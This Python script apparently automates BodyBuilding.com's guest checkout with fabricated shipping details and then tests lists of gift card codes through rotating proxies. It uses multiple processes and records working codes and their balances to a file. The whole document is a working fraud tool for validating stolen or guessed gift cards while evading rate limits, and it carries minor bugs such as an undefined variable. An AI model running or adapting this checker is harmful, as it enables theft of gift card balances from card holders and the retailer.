import requests, re, time
from multiprocessing import Process, Manager, Lock

class BodyBuilding:

    """ 
        Automating Script for BodyBuilding.com
        This checks for working giftcards.
    """

    def __init__(self, lock, max_balance, link, product):
        self.session = requests.session()
        headers = {
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding' : 'gzip, deflate, br',
            'Accept-Language' : 'en-GB,en-US;q=0.8,en;q=0.6',
            'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
            'DNT' : '1',
            'Host' : 'www.bodybuilding.com',
            'Upgrade-Insecure-Requests' : '1'
        }
        self.session.headers.update(headers)
        self.session.verify = False        
        self.lock = lock
        self.max_balance = max_balance
        self.link = link
        self.product = product

    def start(self, giftcode_list, proxy_list, confirm):
        requests.packages.urllib3.disable_warnings()
        """
            This is the main function named start
        """

        # Lock is used to other processes do not interact with the list at the same time
        self.lock.acquire()
        try:
            # Checks if any values are present in the list, if not it quits or else continue
            if not giftcode_list:
                quit()

            giftcode = giftcode_list[0] # Assinging the first value in the list to giftcode
            del giftcode_list[0] # Deleting the assigned value from the list so other processes do not use it
        except:
            print("Problem while getting giftcard or deleting data from list")
            giftcode = "UNDEFINED"
        finally:
            self.lock.release() # Locks need to be released, so other threads do not stay hanging

        if confirm == "yes": # Checks if the user wants to use proxy
            # Getting proxy
            self.lock.acquire()
            try:
                proxy = proxy_list[0]
                del proxy_list[0]
                self.session.proxies.update({'https':'https://{}'.format(proxy)})
            except:
                print("Problem occured while getting proxy or deleting data from list")
            finally:
                self.lock.release()

        
        self.session.get("https://www.bodybuilding.com/")
        r = self.session.get(self.link)

        productId = "UNDEFINED"
        csrf = "UNDEFINED"

        # This returns a SET of all possible values
        skuid = re.findall("https:\/\/cart.bodybuilding.com\/rest\/model\/atg\/commerce\/order\/purchase\/CartModifierActor\/addItemToOrder\?skuId=(\w+)&", str(r.content))

        # The product we are fetching has a static PRODUCT ID
        # NOTE: Do not mess this up with skuID.
        try:    
            productId = r.text.split("https://cart.bodybuilding.com/rest/model/atg/commerce/order/purchase/CartModifierActor/addItemToOrder?skuId={}&productId=".format(skuid[0]))[1].split('{')[0]
        except:
            pass

        # One of them always works / BOTH works actually but not everytime.
        # Since CSRF is same OK to redo it the second time if first works.
        try:
            csrf = r.text.split('=_dynSessConf value="')[1].split('"')[0]
        except:
            pass

        try:
            csrf = r.text.split('csrfToken:"')[1].split('"')[0]
        except:
            pass

        # print(productId)
        # print(csrf)

        # Filtering for any dupes, so we dont repeat ourself
        filteredskuID = []
        for item1 in skuid:
            if item1 not in filteredskuID:
                filteredskuID.append(item1)


        # Adds more products to the cart
        # Check function for more info
        self.adding_products(filteredskuID, productId, csrf)

        
        # Getting the carts page, we do secure checkout here on out
        r = self.session.get("https://www.bodybuilding.com/store/commerce/cart.jsp")
        keys = re.findall('-quantityfield" name="(\d+)', str(r.content))
        values = re.findall('-quantityfield" name="\d+.*value="(\d+)', str(r.content))

        # print(keys)
        # print(values)
        # Sends a big payload so moved it to different function
        self.checkout_page(csrf, keys, values)

        # This is the guest account form filling page
        params = {
            'newCustomer' : 'true'
        }
        self.session.get('https://www.bodybuilding.com/store/commerce/shipping.jsp', params=params)

        headers = {
            'Origin' : 'https://www.bodybuilding.com'
        }
        self.session.headers.update(headers)

        # Another big payload so moved to different function
        self.guest_info_form(csrf)
        r = self.selecting_gift_card_payment(csrf)

        # Extracting "sg" value to send in the form data
        form_data_sg = re.findall("sg(\d+)", str(r.content))

        # Getting the one value, because theres only one and other dupes
        form_data_sg = form_data_sg[0]

        working = self.checking_giftcard(csrf, form_data_sg, giftcode)

        if working == "end":
            quit()

        if working:
            print(giftcode+ " works!")
        else:
            print(giftcode+ " does not work!")

        self.giftcard_check_loop(form_data_sg, csrf, giftcode_list)

    def giftcard_check_loop(self, form_data_sg, csrf, giftcode_list):
        while True:
            # Lock is used to other processes do not interact with the list at the same time
            self.lock.acquire()
            try:
                if not giftcode_list:
                    # print("Thread Ends!")
                    break

                giftcode = giftcode_list[0] # Assinging the first value in the list to giftcode
                del giftcode_list[0] # Deleting the assigned value from the list so other processes do not use it
            finally:
                self.lock.release() # Locks need to be released, so other threads do not stay hanging


            working = self.checking_giftcard(csrf, form_data_sg, giftcode)
            if working:
                print(giftcode+ " works!")
            else:
                print(giftcode+ " does not work!")

    def checking_giftcard(self, csrf, form_data_sg, giftcard):
        """
            Checks for working giftcards and returns appropriate value
        """
        payload = {
            '_dyncharset' : 'UTF-8',
            '_dynSessConf' : csrf,
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.moveToConfirmSuccessURL' : 'https://www.bodybuilding.com/store/commerce/receipt.jsp',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.moveToConfirmSuccessURL' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.moveToConfirmErrorURL' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.moveToConfirmErrorURL' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.creditCardPaymentUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.creditCardPaymentUrl' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.giftCertificatePaymentUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.giftCertificatePaymentUrl' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mailCheckPaymentUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mailCheckPaymentUrl' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.paypalPaymentUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.paypalPaymentUrl' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.addNewCreditCardUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.addNewCreditCardUrl' : '',
            '/bodybuilding/commerce/order/purchase/ShippingPaymentInfoFormHandler.shippingInfo.profileShippingAddress' : '',
            '_D:/bodybuilding/commerce/order/purchase/ShippingPaymentInfoFormHandler.shippingInfo.profileShippingAddress' : '',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.switchBillingMethod' : '',
            '_D:/bodybuilding/commerce/order/purchase/ShippingPaymentInfoFormHandler.updateShippingMethod' : '',
            '_D:/bodybuilding/commerce/order/purchase/ShippingPaymentInfoFormHandler.updateMobileNumber'  : '',
            '_D:/bodybuilding/commerce/order/purchase/ShippingPaymentInfoFormHandler.updatePostalCode' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.extendedOptionTypeSelected' : 'normal',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.extendedOptionTypeSelected' : '',
            '/atg/store/order/purchase/CartFormHandler.order.extendedShippingOptionId' : '',
            '_D:/atg/store/order/purchase/CartFormHandler.order.extendedShippingOptionId' : '',
            '/atg/store/order/purchase/CartFormHandler.order.extendedShippingOptionDisplayName' : '',
            '_D:/atg/store/order/purchase/CartFormHandler.order.extendedShippingOptionDisplayName' : '',
            '/atg/store/order/purchase/CartFormHandler.order.extendedShippingOptionLatestDispatchDate' : '0',
            '_D:/atg/store/order/purchase/CartFormHandler.order.extendedShippingOptionLatestDispatchDate' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapAddress1' : '',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapAddress1' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapAddress2' : '',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapAddress2' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapTown' : '',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapTown' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapCounty' : '',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapCounty' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapPostalCode' : '',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapPostalCode' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapCountry' : '',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.mapCountry' : '',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.billingInfo.paymentType' : '',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.billingInfo.paymentType' : '',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.billingInfo.paymentType' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.billingInfo.paymentType' : 'giftCertificate',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.billingInfo.paymentType' : '',
            '_D:gc-code' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.isSignupNewsletter' : 'true',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.isSignupNewsletter' : '',
            '/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.moveToConfirm' : 'Place Your Order',
            '_D:/bodybuilding/commerce/order/purchase/GiftCertPaymentInfoFormHandler.moveToConfirm' : '',
            '_DARGS' : '/store/commerce/billing/billing-container.jsp.billingForm'
        }

        payload['gc-code'] = giftcard
        payload['/bodybuilding/shipping/group/sg{}'.format(form_data_sg)] = 'Economy (Domestic)'

        params = {
            '_DARGS' : '/store/commerce/billing/billing-container.jsp.billingForm'
        }

        r = self.session.post('https://www.bodybuilding.com/store/commerce/billing.jsp', params=params, data=payload)

        # Checking if giftcard worked or not!
        if "you entered is not in our system" in r.text:
            return False
        else:
            # Fetching the balance of the giftcard
            balance = r.text.split('A Gift Certificate amount of $')[1].split(' was applied to your order. <br/> ')[0]
            self.save_giftcard(giftcode, balance)
                
            # Condition to check whether we hit the max balance requirement
            if float(balance) > self.max_balance:
                print("Max balance hit, terminating the thread.")
                return "end"

            # Assigning it to garbage variable because it returns something always
            garbage = self.selecting_gift_card_payment(csrf)
            del garbage
            return True

    def save_giftcard(self, giftcode, balance):
        """ 
            Saves the giftcard to a text file
        """
        self.lock.acquire()
        try:
            tf = open("working-giftcards.txt", "a")
            tf.write("{} | {}\n".format(giftcode, balance))
            tf.close()
        finally:
            self.lock.release()

    def selecting_gift_card_payment(self, csrf):
        """
            Selects gift card option as payment on the select payments page
        """

        payload = { 
                '_dyncharset' : 'UTF-8',
                '_dynSessConf' : csrf,
                '/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.moveToConfirmSuccessURL' : 'https://www.bodybuilding.com/store/commerce/receipt.jsp',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.moveToConfirmSuccessURL' : '',
                '/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.moveToConfirmErrorURL' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.moveToConfirmErrorURL' : '',
                '/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.creditCardPaymentUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.creditCardPaymentUrl' : '',
                '/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.giftCertificatePaymentUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.giftCertificatePaymentUrl' : '',
                '/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.mailCheckPaymentUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.mailCheckPaymentUrl' : '',
                '/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.paypalPaymentUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.paypalPaymentUrl' : '',
                '/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.addNewCreditCardUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.addNewCreditCardUrl' : '',
                '/bodybuilding/commerce/order/purchase/ShippingPaymentInfoFormHandler.shippingInfo.profileShippingAddress' : '',
                '_D:/bodybuilding/commerce/order/purchase/ShippingPaymentInfoFormHandler.shippingInfo.profileShippingAddress' : '',
                '/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.switchBillingMethod' : 'updateBillingMethod',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.switchBillingMethod' : '',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.billingInfo.paymentType' : '',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.billingInfo.paymentType' : '',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.billingInfo.paymentType' : '',
                '/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.billingInfo.paymentType' : 'giftCertificate',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.billingInfo.paymentType' : '',
                '/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.isSignupNewsletter' : 'true',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.isSignupNewsletter' : '',
                '_D:/bodybuilding/commerce/order/purchase/CardPaymentInfoFormHandler.moveToConfirm' : '',
                '_DARGS' : '/store/commerce/billing/billing-container.jsp.billingForm'
            }

        params = {
            '_DARGS' : '/store/commerce/billing/billing-container.jsp.billingForm'
        }

        r = self.session.post('https://www.bodybuilding.com/store/commerce/billing.jsp', params=params, data=payload)

        return r

    def guest_info_form(self, csrf):
        """
            This function fills out the guest account info.
            Reusing the same value because I GUESS the site dev will not check multiple requests made with same info (HOPEFULLY)
        """
        payload = {
                '_dyncharset' : 'UTF-8',
                '_dynSessConf' : csrf,
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.formSubmit' : 'true',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.formSubmit' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.moveToBillingErrorURL' : 'https://www.bodybuilding.com/store/commerce/shipping.jsp?edit=true',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.moveToBillingErrorURL' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.moveToBillingSuccessURL'  : 'https://www.bodybuilding.com/store/commerce/billing.jsp',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.moveToBillingSuccessURL' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.firstName' : 'Aaron',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.firstName' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.lastName' : 'Black',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.lastName' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.address1' : '84 Sunsine Drive Little Boy AZ 72205',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.address1' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.address2' : '',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.address2' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.city' : 'Little Rock',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.city' : '',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.state' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.state' : 'AZ',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.postalCode' : '72205',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.postalCode' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.country' : 'US',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.country' : '',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.military' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.email' : 'somerandomemail@mail.com',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.email' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.phoneNumber' : '6221516390',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.contactInfo.phoneNumber' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.username' : '',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.username' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.password' : '',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.password' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.confirmPassword' : '',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.confirmPassword' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.saveToProfile' : 'true',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.saveToProfile' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.moveToBilling' : 'submit',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.moveToBilling' : '',
                '/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.nickname' : '',
                '_D:/bodybuilding/commerce/order/purchase/BBShippingInfoFormHandler.shippingInfo.nickname' : '',
                '_DARGS' : '/store/commerce/shipping/shipping-form.jsp.shippingForm'
            }

        params = {
            '_DARGS' : '/store/commerce/shipping/shipping-form.jsp.shippingForm'
        }

        self.session.post('https://www.bodybuilding.com/store/commerce/shipping.jsp', data=payload, params=params)

    def checkout_page(self, csrf, keys, values):
        """
            This one gets the checkout page, the second one after adding the products.
            Also checks if landed on the claim free gifts page, then moves accordingly
        """

        payload = {
                '_dyncharset' : 'UTF-8',
                '_dynSessConf' : csrf,
                '_D:/atg/store/order/purchase/CartFormHandler.checkout' : '',
                '_D:updateCartButton' : '',
                '/atg/store/order/purchase/CartFormHandler.updateSuccessURL' : 'https://www.bodybuilding.com/store/commerce/cart.jsp',
                '_D:/atg/store/order/purchase/CartFormHandler.updateSuccessURL' : '',
                '/atg/store/order/purchase/CartFormHandler.updateErrorURL' : 'https://www.bodybuilding.com/store/commerce/cart.jsp',
                '_D:/atg/store/order/purchase/CartFormHandler.updateErrorURL' : '',
                '/atg/store/order/purchase/CartFormHandler.removeItemFromOrderSuccessURL' : 'https://www.bodybuilding.com/store/commerce/cart.jsp',
                '_D:/atg/store/order/purchase/CartFormHandler.removeItemFromOrderSuccessURL' : '',
                '/atg/store/order/purchase/CartFormHandler.removeItemFromOrderErrorURL' : 'https://www.bodybuilding.com/store/commerce/cart.jsp',
                '_D:/atg/store/order/purchase/CartFormHandler.removeItemFromOrderErrorURL' : '',
                'promoCode' : '',
                '_D:promoCode' : '',
                '/atg/store/order/purchase/CartFormHandler.checkout' : 'SECURE CHECKOUT',
                '_D:/atg/store/order/purchase/CartFormHandler.checkout' : '',
                '_D:/atg/store/order/purchase/CartFormHandler.payPalExpressCheckoutFromCart' : '',
                '/atg/store/order/purchase/CartFormHandler.moveToPurchaseInfoErrorURL' : 'https://www.bodybuilding.com/store/commerce/cart.jsp',
                '_D:/atg/store/order/purchase/CartFormHandler.moveToPurchaseInfoErrorURL' : '',
                '/atg/store/order/purchase/CartFormHandler.qualifiedFreeGiftsUrl' : 'https://www.bodybuilding.com/store/commerce/qualified-freegifts.jsp',
                '_D:/atg/store/order/purchase/CartFormHandler.qualifiedFreeGiftsUrl' : '',
                '/atg/store/order/purchase/CartFormHandler.billingInfoUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp?allowLogin=true',
                '_D:/atg/store/order/purchase/CartFormHandler.billingInfoUrl' : '',
                '/atg/store/order/purchase/CartFormHandler.loginDuringCheckoutURL' : 'https://www.bodybuilding.com/store/commerce/qualified-freegifts.jsp',
                '_D:/atg/store/order/purchase/CartFormHandler.loginDuringCheckoutURL' : '',
                '/atg/store/order/purchase/CartFormHandler.confirmationURL' : 'https://www.bodybuilding.com/store/commerce/qualified-freegifts.jsp',
                '_D:/atg/store/order/purchase/CartFormHandler.confirmationURL' : '',
                '_DARGS' : '/store/commerce/cart/cart-container.jsp.cartForm'
            }

        # Adding the extra payload data i.e the product id and how many.
        for key, value in zip(keys, values):
            payload[key] = value

        params = {
            '_DARGS' : '/store/commerce/cart/cart-container.jsp.cartForm'
        }

        r = self.session.post('https://www.bodybuilding.com/store/commerce/cart.jsp', data=payload, params=params)

        # Checks if we land on "claim your free gift page" then moves to login/info page
        if "CLAIM YOUR" in r.text:
            payload = {
                '_dyncharset' : 'UTF-8',
                '_dynSessConf' : csrf,
                '/bodybuilding/store/freegifts/formhandler/FreeGiftFormHandler.billingInfoUrl' : 'https://www.bodybuilding.com/store/commerce/billing.jsp?allowLogin=true',
                '_D:/bodybuilding/store/freegifts/formhandler/FreeGiftFormHandler.billingInfoUrl' : '',
                '/bodybuilding/store/freegifts/formhandler/FreeGiftFormHandler.continueWithoutGift' : 'Continue Without Gift',
                '_D:/bodybuilding/store/freegifts/formhandler/FreeGiftFormHandler.continueWithoutGift' : '',
                '_DARGS' : '/store/commerce/freegifts/qualified-freegifts-container.jsp.tierOneNoGiftForm'
            }

            params = {
                '_DARGS' : '/store/commerce/freegifts/qualified-freegifts-container.jsp.tierOneNoGiftForm'
            }

            self.session.post('https://www.bodybuilding.com/store/commerce/qualified-freegifts.jsp', data=payload, params=params)

    def adding_products(self, skuID_LIST, productId, csrf):
        """
            This function adds extra products to increase the price.
            Sends request with the skuID (the individual product list apparently) to register the product to cart
            Is optional and based on user input
        """

        headers = {
            'Referer' : self.link,
            'Origin' : 'https://www.bodybuilding.com',
            'Host' : 'cart.bodybuilding.com'
        }
        self.session.headers.update(headers)
        # Counter variable to keep track of number of products added
        counter = quantity = 1

        # Adding extra item(s)
        for skuID in skuID_LIST:            
            params = {
                'skuId' : skuID,
                'productId' : productId,
                'quantity' : quantity,
                'CSRF' : csrf
            }
            headers = {
                'Access-Control-Request-Headers' : 'bb-app,content-type',
                'Access-Control-Request-Method' : 'POST'
            }
            self.session.headers.update(headers)
            self.session.options('https://cart.bodybuilding.com/rest/model/atg/commerce/order/purchase/CartModifierActor/addItemToOrder', params=params)
            headers = {
                'Access-Control-Request-Headers' : None,
                'Access-Control-Request-Method' : None,
                'BB-App' : 'add-to-cart, 12.0.1',
                'Content-Type' : 'application/json;charset=utf-8',
                'Content-Length' : '0'
            }
            self.session.headers.update(headers)
            self.session.post('https://cart.bodybuilding.com/rest/model/atg/commerce/order/purchase/CartModifierActor/addItemToOrder', params=params)
            
            headers = {
                'BB-App' : None,
                'Content-Type' : None,
                'Content-Length' : None
            }
            self.session.headers.update(headers)

            counter += 1
            # Condition to check whether number of products are added to required amount
            if counter >= self.product:
                break

        # End of adding extra items
        
        # Reverting to old headers [NEEDED FOR NORMAL SITE REQUEST]
        headers = {
            'Origin' : None,
            'Host' : 'www.bodybuilding.com'
        }
        self.session.headers.update(headers)

    def load_list(self):
        giftcode_list = []
        with open("giftcards.txt", "r") as giftcards:
            for giftcode in giftcards:
                giftcode_list.append(giftcode)

        proxy_list = []
        with open("proxies.txt", "r") as proxies:
            for proxy in proxies:
                proxy_list.append(proxy)

        return giftcode_list, proxy_list


if __name__ == "__main__":
    print("----"*4)
    print("BodyBuilding.com Script Made by Saitama / Sage#9044")
    print("Version: 2.0")
    print("----"*4)
    print()
    threads_num = int(input("Enter the number of threads: "))
    confirm_proxy_usage = input("Do you want to use proxies? (yes/no): ")
    max_balance = int(input("Enter the max balance: "))
    link = input("Enter the link: ")
    products = int(input("How many products to add?:(1,2...) "))

    lock = Lock()
    bot = BodyBuilding(lock=lock, max_balance=max_balance, link=link, product=products)
    alpha_giftcode_list, alpha_proxy_list = bot.load_list()

    with Manager() as manager:
        giftcode_list = manager.list()
        proxy_list = manager.list()

        # Adding data to giftcode and proxy list

        for giftcode in alpha_giftcode_list:
            giftcode = giftcode.strip()
            giftcode_list.append(giftcode)

        for proxy in alpha_proxy_list:
            proxy = proxy.strip()
            proxy_list.append(proxy)

        processes = []

        for i in range(threads_num):
            p = Process(target=bot.start, args=(giftcode_list, proxy_list, confirm_proxy_usage))
            p.start()
            processes.append(p)

        for p in processes:
            p.join()

        # Loop and condition to check if any giftcode are left behind, then creates new processes for them
        remProcess = []
        while True:
            if giftcode_list:
                for i in range(5):
                    p = Process(target=bot.start, args=(giftcode_list, proxy_list, confirm_proxy_usage))
                    p.start()
                    remProcess.append(p)
                for p in remProcess:
                    p.join()
            else:
                break

        Print("~~~End of Checking~~~")

